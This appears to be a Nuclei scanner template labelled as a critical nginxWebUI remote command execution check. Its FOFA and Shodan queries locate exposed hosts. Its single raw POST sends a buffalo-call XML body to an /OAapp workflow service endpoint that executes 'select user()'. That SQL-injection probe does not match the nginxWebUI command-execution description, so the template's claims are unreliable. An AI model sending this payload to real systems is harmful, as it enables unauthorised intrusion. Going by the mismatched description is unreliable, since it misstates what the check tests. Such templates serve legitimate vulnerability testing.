id: nginx-webui-rce
info:
  author: ritikchaddha
  description: 'There is a command execution vulnerability in the nginxWebUI backend.
    After logging in to the backend, the attacker can execute any command to obtain
    server permissions.

    '
  metadata:
    fofa-query: title="nginxwebui"
    max-request: 1
    shodan-query: title="nginxwebui"
  name: nginxWebUI ≤ 3.5.0 - Remote Command Execution
  reference:
  - https://forum.butian.net/article/243
  severity: critical
  tags: nginx,nginxwebui,webui,rce,vuln
---
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/xml")
    - contains_all(body,"<buffalo-reply>" ,"<string>user()")
    type: dsl
  raw:
  - 'POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1

    Host: {{Hostname}}


    <buffalo-call>

    <method>getDataListForTree</method>

    <string>select user()</string>

    </buffalo-call>

    '
